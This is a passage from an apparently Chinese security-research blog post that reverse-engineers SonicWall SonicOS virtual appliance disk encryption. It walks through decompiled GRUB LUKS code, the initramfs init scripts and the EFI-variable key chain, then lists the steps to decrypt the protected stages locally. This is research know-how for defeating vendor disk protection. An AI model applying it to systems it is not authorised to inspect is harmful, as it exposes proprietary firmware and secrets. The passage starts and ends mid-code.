class="keyword">return</span> v39;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v36 = grub_disk_read(a1, v34, <span class="number">0LL</span>, v35, v19);</span><br><span class="line">          <span class="keyword">if</span> ( v36 )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_46;</span><br><span class="line">        &#125;</span><br><span class="line">        v33 = grub_cryptodisk_decrypt(a2, v19, v35, <span class="number">0LL</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v33 )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_55;</span><br><span class="line">        v33 = AF_merge(*(a2 + <span class="number">88</span>), v19, v50, v38, _byteswap_ulong(v31[<span class="number">9</span>]));</span><br><span class="line">        <span class="keyword">if</span> ( v33 )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_55;</span><br><span class="line">        grub_real_dprintf(<span class="string">&quot;disk/luks.c&quot;</span>, <span class="number">306LL</span>, <span class="string">&quot;luks&quot;</span>, <span class="string">&quot;candidate key recovered\n&quot;</span>);</span><br><span class="line">        v32 = grub_crypto_pbkdf2(</span><br><span class="line">                *(a2 + <span class="number">88</span>),</span><br><span class="line">                v50,</span><br><span class="line">                _byteswap_ulong(disk_data[<span class="number">27</span>]),</span><br><span class="line">                &amp;disk_data[<span class="number">33</span>],</span><br><span class="line">                <span class="number">32LL</span>,</span><br><span class="line">                _byteswap_ulong(disk_data[<span class="number">41</span>]),</span><br><span class="line">                v47,</span><br><span class="line">                <span class="number">20LL</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v32 )</span><br><span class="line">        &#123;</span><br><span class="line">LABEL_51:</span><br><span class="line">          v40 = v32;</span><br><span class="line">          grub_free(v19);</span><br><span class="line">          v37 = v40;</span><br><span class="line">          <span class="keyword">return</span> grub_crypto_gcry_error(v37);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( !grub_memcmp(v47, &amp;disk_data[<span class="number">28</span>], <span class="number">20LL</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          v33 = grub_cryptodisk_setkey(a2, v50, v38);</span><br><span class="line">          <span class="keyword">if</span> ( v33 )</span><br><span class="line">          &#123;</span><br><span class="line">LABEL_55:</span><br><span class="line">            grub_free(v19);</span><br><span class="line">            v37 = v33;</span><br><span class="line">            <span class="keyword">return</span> grub_crypto_gcry_error(v37);</span><br><span class="line">          &#125;</span><br><span class="line">          grub_free(v19);</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        v15 = &amp;loc_148;</span><br><span class="line">        grub_real_dprintf(<span class="string">&quot;disk/luks.c&quot;</span>, <span class="number">328LL</span>, <span class="string">&quot;luks&quot;</span>, <span class="string">&quot;bad digest\n&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      v31 += <span class="number">12</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v26 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v26 = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v15 = (sub_0 + <span class="number">1</span>);</span><br><span class="line">      v26 = <span class="number">1</span>;</span><br><span class="line">      grub_printf_(<span class="string">&quot;%u attempt%s remaining.\n&quot;</span>, <span class="number">1</span>, &amp;unk_B64);</span><br><span class="line">    &#125;</span><br><span class="line">    a4 = <span class="number">0LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !v26 )</span><br><span class="line">    &#123;</span><br><span class="line">      grub_free(v19);</span><br><span class="line">      v16 = <span class="string">&quot;access denied&quot;</span>;</span><br><span class="line">      v17 = <span class="number">30LL</span>;</span><br><span class="line">      <span class="keyword">return</span> grub_error(v17, v16);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v45 )</span><br><span class="line">  &#123;</span><br><span class="line">    a4 = v49;    <span class="comment">// [4]</span></span><br><span class="line">    v45 = <span class="number">0</span>;</span><br><span class="line">    v43 = <span class="number">52LL</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_38;</span><br><span class="line">  &#125;</span><br><span class="line">  name = <span class="number">0LL</span>;</span><br><span class="line">  v28 = a1[<span class="number">5</span>];</span><br><span class="line">  <span class="keyword">if</span> ( v28 )</span><br><span class="line">    name = grub_partition_get_name(v28, v15, v25, v23);</span><br><span class="line">  v29 = &amp;unk_B64;</span><br><span class="line">  v30 = &amp;unk_B64;</span><br><span class="line">  <span class="keyword">if</span> ( name )</span><br><span class="line">    v30 = name;</span><br><span class="line">  <span class="keyword">if</span> ( a1[<span class="number">5</span>] )</span><br><span class="line">    v29 = &amp;unk_B65;</span><br><span class="line">  grub_printf_(<span class="string">&quot;Enter passphrase for %s%s%s (%s): &quot;</span>, *a1, v29, v30, a2 + <span class="number">140</span>);</span><br><span class="line">  grub_free(name);</span><br><span class="line">  v15 = (&amp;loc_FE + <span class="number">2</span>);</span><br><span class="line">  <span class="keyword">if</span> ( grub_password_get(&amp;v52, <span class="number">256LL</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    a4 = &amp;v52;</span><br><span class="line">    v43 = grub_strlen(&amp;v52);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_38;</span><br><span class="line">  &#125;</span><br><span class="line">  grub_free(v19);</span><br><span class="line">  v16 = <span class="string">&quot;Passphrase not supplied&quot;</span>;</span><br><span class="line">  v17 = <span class="number">18LL</span>;</span><br><span class="line">  <span class="keyword">return</span> grub_error(v17, v16);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>简要分析上面的代码，首先在 <code>[1]</code> 处，代码会调用 <code>grub_disk_read</code> 尝试从磁盘读取 592 字节的数据，在 <code>[2]</code> 处，调用 <code>grub_puts</code> 函数输出了 <code>Loading...</code> 字符串，在开机时可以看到这个字符串。</p>
<p>从 <code>[3]</code> 处开始，代码使用从磁盘读取的 592 字节数据进行一些复杂运算，最终会将计算结果保存在变量 v49 中。在 <code>[5]</code> 处会调用 <code>grub_crypto_pbkdf2</code> 解密磁盘，我们知道它的第二个参数应该是密钥，但在调用该函数之前都没有操作变量 a4 的逻辑。</p>
<p>继续向下分析代码发现在 <code>[4]</code> 处会将 a4 赋值为 v49，说明密钥确实和磁盘头部数据有关。那么将生成密钥的逻辑梳理出来形成程序，在本地就可以直接解密硬盘，无需复杂的调试过程。</p>
<p>具体实现请参考仓库代码。</p>
<h2 id="SonicOS-7-1"><a href="#SonicOS-7-1" class="headerlink" title="SonicOS 7.1"></a>SonicOS 7.1</h2><p>目前 SonicOS 的最新版本为 7.1.2，和前面相同的思路挂载硬盘后发现分区信息有变化</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sdb                                                                                   </span><br><span class="line">├─sdb1 vfat   FAT16 BOOT          EBD9-9F71                                           </span><br><span class="line">├─sdb2 vfat   FAT16 BOOT_A        CE80-C973                                           </span><br><span class="line">├─sdb3 vfat   FAT16 BOOT_B        8752-5DF4                                           </span><br><span class="line">├─sdb4 vfat   FAT16 SYSTEM_BOOT   31CF-394A                                           </span><br><span class="line">├─sdb5 ext4   1.0   INSTALL-CACHE 829fb2a8-48d1-4416-8d60-a63cc4bcea77                </span><br><span class="line">└─sdb6</span><br></pre></td></tr></table></figure></div>

<p>前面 4 个似乎都是启动分区，sdb5 可以直接挂载，但其中只保存了系统当前正在运行的 <code>.bin.sig</code> 固件文件，且该文件是加密的，sdb6 的格式无法识别。</p>
<p>挂载 BOOT 分区，文件内容也和老版本不同，现在 GRUB 被打包成了 EFI&#x2F;BOOT&#x2F;bootx64.efi 文件，此外还有 SYSTEM.LIC 和 SYSTEM.SYS 两个文件，SYSTEM.LIC 是一个压缩包，解压可以得到 <code>DATA:FW-crypt-release.key-877cebb9-f923-4245-9952-18a00ce5f77d</code> 等数个类似密钥的文档，但格式都无法识别。</p>
<p>使用 binwalk 分析并解压 bootx64.efi 文件，得到一个叫做 soniccorex.bin 的 Linux 内核文件，它应该就是虚拟机 Linux 系统的内核。</p>
<p>解密磁盘这个行为有可能发生在内核或者 initramfs 中，按照以往的思路先定位到 populate_rootfs，该函数负责解压 initramfs 镜像。通过调试内核的方式在 populate_rootfs 下断点，从内存中可以提取 initramfs 压缩包。</p>
<p>解压后得到一个标准的 Linux 文件系统，其中包含一些关键文件，例如 <code>onetime.key.enc</code>、<code>sunup.cpio.gz.enc</code> 等。分析 &#x2F;init 这个初始化脚本，里面包含大量和解密相关的代码，这里列举部分关键代码，简要分析这个脚本的逻辑。</p>
<p>脚本主要执行以下几个操作</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">early_setup</span><br><span class="line"></span><br><span class="line"><span class="built_in">test</span> <span class="string">&quot;<span class="variable">$VERBOSE</span>&quot;</span> = <span class="string">&quot;0&quot;</span> &amp;&amp; <span class="built_in">exec</span> 2&gt;/tmp/preload.log</span><br><span class="line"></span><br><span class="line">[ -z <span class="string">&quot;<span class="variable">$CONSOLE</span>&quot;</span> ] &amp;&amp; CONSOLE=<span class="string">&quot;/dev/console&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># read and process command line args (for dev pass verbose debugshell)</span></span><br><span class="line"><span class="comment">#read_args</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># decrypt stage2 initramfs (sunup)</span></span><br><span class="line">setup_stage2</span><br><span class="line"></span><br><span class="line"><span class="comment"># jump to stage2</span></span><br><span class="line">mount_and_boot</span><br></pre></td></tr></table></figure></div>

<p>从代码可以看到应该还存在一个叫做 “sunup” 的 initramfs，说明内核加载的 initramfs 中可能没有直接解密硬盘。</p>
<p>early_setup 函数执行一些初始化操作，setup_stage2 为关键函数，它会调用 unpack_stage2 函数。</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">unpack_stage2</span></span>() &#123;</span><br><span class="line">    <span class="built_in">echo</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">test</span> -n <span class="string">&quot;<span class="variable">$&#123;SPECIAL_BUILD_MESSAGE// /&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">then</span> <span class="built_in">echo</span> <span class="string">&quot;**<span class="variable">$&#123;SPECIAL_BUILD_MESSAGE//?/*&#125;</span>**&quot;</span> &amp;&amp;</span><br><span class="line">         <span class="built_in">echo</span> <span class="string">&quot;* <span class="variable">$SPECIAL_BUILD_MESSAGE</span> *&quot;</span>        &amp;&amp;</span><br><span class="line">         <span class="built_in">echo</span> <span class="string">&quot;**<span class="variable">$&#123;SPECIAL_BUILD_MESSAGE//?/*&#125;</span>**&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">    sanity_check</span><br><span class="line"></span><br><span class="line">    <span class="built_in">log</span> <span class="string">&quot;Setting up stage2 initramfs (sunup) ...&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">local</span> use_sunup_key_from=<span class="string">&quot;<span class="variable">$&#123;SUNUP_USE_KEY_FROM&#125;</span>&quot;</span></span><br><span class="line">    <span class="built_in">local</span> kek</span><br><span class="line">    kek=$(<span class="built_in">mktemp</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">test</span> <span class="string">&quot;<span class="variable">$use_sunup_key_from</span>&quot;</span> = <span class="string">&quot;FS&quot;</span></span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">      <span class="keyword">if</span> is_key_in_fs</span><br><span class="line">      <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">log</span> <span class="string">&quot;Found key in FS...&quot;</span></span><br><span class="line">        <span class="comment"># key=/onetime.key is present in FS</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        halt <span class="string">&quot;Unable to setup stage2 (key not in fs) ...&quot;</span></span><br><span class="line">      <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">test</span> <span class="string">&quot;<span class="variable">$use_sunup_key_from</span>&quot;</span> = <span class="string">&quot;UEFI&quot;</span></span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">      <span class="keyword">if</span> is_kek_in_uefi</span><br><span class="line">      <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">log</span> <span class="string">&quot;Found key in UEFI ...&quot;</span></span><br><span class="line">        do_get_kek_from_uefi &gt; <span class="string">&quot;<span class="variable">$kek</span>&quot;</span></span><br><span class="line">        openssl rsautl -verify -<span class="keyword">in</span> <span class="string">&quot;<span class="variable">$&#123;ENC_KEY&#125;</span>&quot;</span> -pubin -inkey <span class="string">&quot;<span class="variable">$kek</span>&quot;</span> -out <span class="variable">$&#123;KEY&#125;</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        halt <span class="string">&quot;BIOS not properly provisioned, please contact technical support&quot;</span></span><br><span class="line">      <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">test</span> <span class="string">&quot;<span class="variable">$use_sunup_key_from</span>&quot;</span> = <span class="string">&quot;SSSS&quot;</span></span><br><span class="line">    <span class="keyword">then</span> <span class="keyword">if</span> get_key_from_ssss &gt; <span class="string">&quot;<span class="variable">$KEY</span>&quot;</span></span><br><span class="line">         <span class="keyword">then</span> <span class="built_in">log</span> <span class="string">&quot;Found key in SSSS ...&quot;</span></span><br><span class="line">         <span class="keyword">else</span> halt <span class="string">&quot;Corrupt/missing secure store, please contact technical support&quot;</span></span><br><span class="line">         <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">test</span> <span class="string">&quot;<span class="variable">$use_sunup_key_from</span>&quot;</span> = <span class="string">&quot;OVMF&quot;</span></span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">      <span class="keyword">if</span> is_kek_in_ovmf</span><br><span class="line">      <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">log</span> <span class="string">&quot;Found key in OVMF ...&quot;</span></span><br><span class="line">        do_get_kek_from_ovmf &gt; <span class="string">&quot;<span class="variable">$kek</span>&quot;</span></span><br><span class="line">        openssl rsautl -verify -decrypt -<span class="keyword">in</span> <span class="string">&quot;<span class="variable">$&#123;ENC_KEY&#125;</span>&quot;</span> -inkey <span class="string">&quot;<span class="variable">$kek</span>&quot;</span> -out <span class="variable">$&#123;KEY&#125;</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        halt <span class="string">&quot;Please use SonicWall supplied UEFI OVMF_CODE. Please contact technical support &quot;</span></span><br><span class="line">      <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">test</span> <span class="string">&quot;<span class="variable">$use_sunup_key_from</span>&quot;</span> = <span class="string">&quot;ACPI_BGRT_XFRM_UTIL&quot;</span></span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">        <span class="keyword">if</span> is_kek_in_acpi_bgrt</span><br><span class="line">        <span class="keyword">then</span></span><br><span class="line">          <span class="built_in">log</span> <span class="string">&quot;Found key in XFRM ...&quot;</span></span><br><span class="line">          do_get_kek_from_acpi_bgrt &gt; <span class="string">&quot;<span class="variable">$kek</span>&quot;</span></span><br><span class="line">          openssl enc -a -aes-256-cbc -d -pbkdf2 -<span class="keyword">in</span> <span class="variable">$&#123;ENC_KEY&#125;</span> -salt -out <span class="variable">$&#123;KEY&#125;</span> -pass file:<span class="string">&quot;<span class="variable">$kek</span>&quot;</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          halt <span class="string">&quot;Please use SonicWall supplied OVMF, please contact technical support&quot;</span></span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># decrypt stage2 (sunup)</span></span><br><span class="line">    openssl enc -a -d -aes-256-cbc -pbkdf2 \</span><br><span class="line">      -<span class="keyword">in</span> <span class="variable">$ROOT_IMAGE_ENC</span> -salt \</span><br><span class="line">      -out <span class="variable">$ROOT_IMAGE</span> \</span><br><span class="line">      -pass file:<span class="variable">$&#123;KEY&#125;</span></span><br><span class="line"></span><br><span class="line">    rc=$?</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">test</span> <span class="variable">$rc</span> -ne 0</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">      halt <span class="string">&quot;Unable to setup stage2 initramfs (sunup) ...&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">log</span> <span class="string">&quot;Finished setting up stage2 initramfs (sunup) ... &quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这个函数包含几种不同的密钥加载方法，虚拟机环境中默认使用 SSSS 方法，因此代码又会调用 get_key_from_ssss 函数。</p>
<p>部分关键逻辑列举如下：</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">efi_get_var</span></span>() &#123;</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">test</span> -e <span class="string">&quot;/sys/firmware/efi/efivars/<span class="variable">$1</span>&quot;</span>    <span class="comment"># check if file exists</span></span><br><span class="line">    <span class="keyword">then</span> <span class="built_in">dd</span> bs=1 skip=4 2&gt;/dev/null &lt; <span class="string">&quot;/sys/firmware/efi/efivars/<span class="variable">$1</span>&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">test</span> -n <span class="string">&quot;<span class="variable">$&#123;SECURE_STORE_BACKUP_SYS&#125;</span>&quot;</span> <span class="comment"># look on backup</span></span><br><span class="line">    <span class="keyword">then</span> with-mount-sys-partition <span class="string">&quot;<span class="variable">$&#123;SECURE_STORE_BACKUP_SYS&#125;</span>&quot;</span> <span class="string">&quot;<span class="variable">$&#123;SECURE_STORE_BACKUP_PARTITION&#125;</span>&quot;</span> tar -xzf <span class="string">&quot;<span class="variable">$&#123;SECURE_STORE_BACKUP_FILE&#125;</span>&quot;</span> -O <span class="string">&quot;<span class="variable">$1</span>&quot;</span> | <span class="built_in">dd</span> bs=1 skip=4 2&gt;/dev/null</span><br><span class="line">    <span class="keyword">fi</span> &amp;&amp; pipe-result</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># non TINY data</span></span><br><span class="line"><span class="function"><span class="title">efi_get_data</span></span>() &#123;</span><br><span class="line">    <span class="built_in">local</span> pass</span><br><span class="line">    <span class="comment"># 2-step to avoid contention on tpm0 device as sonictpm doesn&#x27;t retry</span></span><br><span class="line">    pass=$(efi_get_var <span class="string">&quot;KEY<span class="variable">$&#123;SCX_SECURE_STORE_SEPARATOR&#125;</span><span class="variable">$1</span>-<span class="variable">$&#123;SSSS_UEFI_ID&#125;</span>&quot;</span> | /bin/gunzip | dessss | <span class="built_in">base64</span> &amp;&amp; pipe-result ) &amp;&amp;</span><br><span class="line">    efi_get_var <span class="string">&quot;DATA<span class="variable">$&#123;SCX_SECURE_STORE_SEPARATOR&#125;</span><span class="variable">$1</span>-<span class="variable">$&#123;SSSS_UEFI_ID&#125;</span>&quot;</span> | openssl enc -des-ecb -iter 512 -d -pass file:&lt;( <span class="built_in">base64</span> -d &lt;&lt;&lt;<span class="string">&quot;<span class="variable">$pass</span>&quot;</span> ) &amp;&amp; pipe-result</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">get_kek_from_ssss</span></span>() &#123;</span><br><span class="line">    efi_get_data <span class="string">&quot;<span class="variable">$&#123;SSSS_UEFI_KEY&#125;</span>&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">get_key_from_ssss</span></span>() &#123;</span><br><span class="line">    <span class="built_in">local</span> kek</span><br><span class="line">    kek=$(<span class="built_in">mktemp</span>) &amp;&amp; get_kek_from_ssss &gt; <span class="string">&quot;<span class="variable">$kek</span>&quot;</span> &amp;&amp; openssl rsautl -decrypt -inkey <span class="string">&quot;<span class="variable">$kek</span>&quot;</span> -<span class="keyword">in</span> <span class="string">&quot;<span class="variable">$&#123;ENC_KEY&#125;</span>&quot;</span></span><br><span class="line">    just <span class="built_in">rm</span> -f <span class="string">&quot;<span class="variable">$kek</span>&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>简要总结解密 sunup 的逻辑</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 从 /sys/firmware/efi/efivars 目录下读取 KEY:SUNUP 密钥</span><br><span class="line">2. 根据 CryptoEnging 设置解密方法 (默认为 crypto-engine-openssl)</span><br><span class="line">3. 读取 LastBootMachineId 作为密码对密钥进行解密</span><br><span class="line">4. 使用得到的 KEY 去解密 DATA:SUNUP 文件</span><br><span class="line">5. 用得到的 SUNUP RSA 私钥解密 onetime.key.enc 文件</span><br><span class="line">6. 用 onetime.key 再去解密 sunup.cpio.gz.enc 文件</span><br></pre></td></tr></table></figure></div>

<p>从逻辑上看系统应该是实现了一套 SecureBoot 流程，猜测在硬件设备上具有 TPM 等安全芯片，密钥信息被保存到芯片中。但在虚拟机环境下不具备 TPM 条件，所以只能将密钥保存在 BOOT 分区中。</p>
<p>按照以上逻辑解密 SUNUP，得到第二个 initramfs，在这个阶段代码就会解密磁盘。还是分析 &#x2F;init 程序，它会拉起 &#x2F;init.d 中的初始化脚本，其中有一个叫做 14-keys 的脚本负责初始化密钥。</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">keys_install_key</span></span>() &#123;</span><br><span class="line">  <span class="keyword">if</span> <span class="built_in">type</span> -p secure-store &amp;&gt;/dev/null <span class="comment">#&amp;&amp; test &quot;$&#123;SECURE_STORE_RSA_SUPPORT:-0&#125;&quot; != &quot;0&quot;</span></span><br><span class="line">  <span class="keyword">then</span> <span class="comment"># info &quot;Importing $2=$1&quot;</span></span><br><span class="line">       <span class="built_in">local</span> <span class="built_in">md5sum</span> current</span><br><span class="line">       <span class="keyword">if</span> ! <span class="built_in">md5sum</span>=$(<span class="built_in">md5sum</span> <span class="string">&quot;<span class="variable">$1</span>&quot;</span>) || ! <span class="built_in">read</span> -r <span class="built_in">md5sum</span> _ &lt;&lt;&lt;<span class="string">&quot;<span class="variable">$md5sum</span>&quot;</span></span><br><span class="line">       <span class="keyword">then</span> debug <span class="string">&quot;Can&#x27;t read <span class="variable">$1</span>&quot;</span></span><br><span class="line">            <span class="built_in">return</span> 1</span><br><span class="line">       <span class="keyword">elif</span> current=$(secure-store <span class="string">&quot;<span class="variable">$&#123;SECURE_STORE_DEFAULT&#125;</span>&quot;</span> get <span class="string">&quot;md5sum:<span class="variable">$2</span>&quot;</span>) &amp;&amp; <span class="built_in">read</span> -r current _ &lt;&lt;&lt;<span class="string">&quot;<span class="variable">$current</span>&quot;</span> &amp;&amp; <span class="built_in">test</span> <span class="string">&quot;<span class="variable">$md5sum</span>&quot;</span> = <span class="string">&quot;<span class="variable">$current</span>&quot;</span></span><br><span class="line">       <span class="keyword">then</span> debug <span class="string">&quot;Already imported <span class="variable">$2</span>&quot;</span></span><br><span class="line">       <span class="keyword">elif</span> secure-store <span class="string">&quot;<span class="variable">$&#123;SECURE_STORE_DEFAULT&#125;</span>&quot;</span> import <span class="string">&quot;<span class="variable">$1</span>&quot;</span> <span class="string">&quot;<span class="variable">$2</span>&quot;</span> &amp;&amp; secure-store <span class="string">&quot;<span class="variable">$&#123;SECURE_STORE_DEFAULT&#125;</span>&quot;</span> put <span class="string">&quot;md5sum:<span class="variable">$2</span>&quot;</span> &lt;&lt;&lt;<span class="string">&quot;<span class="variable">$md5sum</span>&quot;</span></span><br><span class="line">       <span class="keyword">then</span> debug <span class="string">&quot;Imported <span class="variable">$2</span>=<span class="variable">$1</span>&quot;</span></span><br><span class="line">       <span class="keyword">else</span> warn <span class="string">&quot;Importing <span class="variable">$2</span>=<span class="variable">$1</span> failed&quot;</span></span><br><span class="line">            <span class="built_in">return</span> 1</span><br><span class="line">       <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">       <span class="comment"># copy key to extra store without re-importing</span></span><br><span class="line">       <span class="keyword">if</span> <span class="built_in">test</span> -n <span class="string">&quot;<span class="variable">$&#123;SECURE_STORE_EXTRA&#125;</span>&quot;</span></span><br><span class="line">       <span class="keyword">then</span> <span class="keyword">if</span> current=$(secure-store <span class="string">&quot;<span class="variable">$&#123;SECURE_STORE_DEFAULT&#125;</span>&quot;</span> get <span class="string">&quot;<span class="variable">$2</span>&quot;</span>) &amp;&amp; <span class="built_in">read</span> -r current _ &lt;&lt;&lt;<span class="string">&quot;<span class="variable">$current</span>&quot;</span> &amp;&amp;</span><br><span class="line">               <span class="built_in">md5sum</span>=$(secure-store <span class="string">&quot;<span class="variable">$&#123;SECURE_STORE_EXTRA&#125;</span>&quot;</span> get <span class="string">&quot;<span class="variable">$2</span>&quot;</span>) &amp;&amp; <span class="built_in">read</span> -r <span class="built_in">md5sum</span> _ &lt;&lt;&lt;<span class="string">&quot;<span class="variable">$md5sum</span>&quot;</span> &amp;&amp;</span><br><span class="line">               <span class="built_in">test</span> <span class="string">&quot;<span class="variable">$md5sum</span>&quot;</span> = <span class="string">&quot;<span class="variable">$current</span>&quot;</span></span><br><span class="line">            <span class="keyword">then</span> debug <span class="string">&quot;Already imported extra <span class="variable">$2</span>&quot;</span></span><br><span class="line">            <span class="keyword">else</span> <span class="comment"># get key imported somehow</span></span><br><span class="line">                 <span class="keyword">if</span> secure-store <span class="string">&quot;<span class="variable">$&#123;SECURE_STORE_DEFAULT&#125;</span>&quot;</span> get <span class="string">&quot;<span class="variable">$2</span>&quot;</span> | secure-store <span class="string">&quot;<span class="variable">$&#123;SECURE_STORE_EXTRA&#125;</span>&quot;</span> put <span class="string">&quot;<span class="variable">$2</span>&quot;</span> &amp;&amp;</span><br><span class="line">                    secure-store <span class="string">&quot;<span class="variable">$&#123;SECURE_STORE_EXTRA&#125;</span>&quot;</span> put <span class="string">&quot;md5sum:<span class="variable">$2</span>&quot;</span> &lt;&lt;&lt;<span class="string">&quot;<span class="variable">$md5sum</span>&quot;</span></span><br><span class="line">                 <span class="keyword">then</span> debug <span class="string">&quot;Imported extra <span class="variable">$2</span>=<span class="variable">$1</span>&quot;</span></span><br><span class="line">                 <span class="keyword">else</span> <span class="comment"># Can&#x27;t import from SECURE_STORE_DEFAULT as it doesn&#x27;t work</span></span><br><span class="line">                      warn <span class="string">&quot;Importing extra <span class="variable">$2</span>=<span class="variable">$1</span> difficult&quot;</span></span><br><span class="line">                      <span class="keyword">if</span> ! <span class="built_in">md5sum</span>=$(<span class="built_in">md5sum</span> <span class="string">&quot;<span class="variable">$1</span>&quot;</span>) || ! <span class="built_in">read</span> -r <span class="built_in">md5sum</span> _ &lt;&lt;&lt;<span class="string">&quot;<span class="variable">$md5sum</span>&quot;</span></span><br><span class="line">                      <span class="keyword">then</span> debug <span class="string">&quot;Can&#x27;t read <span class="variable">$1</span>&quot;</span></span><br><span class="line">                           <span class="built_in">return</span> 1</span><br><span class="line">                      <span class="keyword">elif</span> current=$(secure-store <span class="string">&quot;<span class="variable">$&#123;SECURE_STORE_EXTRA&#125;</span>&quot;</span> get <span class="string">&quot;md5sum:<span class="variable">$2</span>&quot;</span>) &amp;&amp; <span class="built_in">read</span> -r current _ &lt;&lt;&lt;<span class="string">&quot;<span class="variable">$current</span>&quot;</span> &amp;&amp; <span class="built_in">test</span> <span class="string">&quot;<span class="variable">$md5sum</span>&quot;</span> = <span class="string">&quot;<span class="variable">$current</span>&quot;</span></span><br><span class="line">                      <span class="keyword">then</span> debug <span class="string">&quot;Already imported extra <span class="variable">$2</span>&quot;</span></span><br><span class="line">                      <span class="keyword">elif</span> secure-store <span class="string">&quot;<span class="variable">$&#123;SECURE_STORE_EXTRA&#125;</span>&quot;</span> import <span class="string">&quot;<span class="variable">$1</span>&quot;</span> <span class="string">&quot;<span class="variable">$2</span>&quot;</span> &amp;&amp; secure-store <span class="string">&quot;<span class="variable">$&#123;SECURE_STORE_EXTRA&#125;</span>&quot;</span> put <span class="string">&quot;md5sum:<span class="variable">$2</span>&quot;</span> &lt;&lt;&lt;<span class="string">&quot;<span class="variable">$md5sum</span>&quot;</span></span><br><span class="line">                      <span class="keyword">then</span> debug <span class="string">&quot;Imported extra <span class="variable">$2</span>=<span class="variable">$1</span>&quot;</span></span><br><span class="line">                      <span class="keyword">else</span> info <span class="string">&quot;Importing extra <span class="variable">$2</span>=<span class="variable">$1</span> failed&quot;</span></span><br><span class="line">                           <span class="built_in">return</span> 1</span><br><span class="line">                      <span class="keyword">fi</span></span><br><span class="line">                 <span class="keyword">fi</span></span><br><span class="line">            <span class="keyword">fi</span></span><br><span class="line">       <span class="keyword">fi</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">keys_init_platform_keys</span></span>() &#123;</span><br><span class="line">    <span class="comment"># import install keys into keyring</span></span><br><span class="line">    <span class="built_in">local</span> name</span><br><span class="line">    <span class="keyword">for</span> name <span class="keyword">in</span> <span 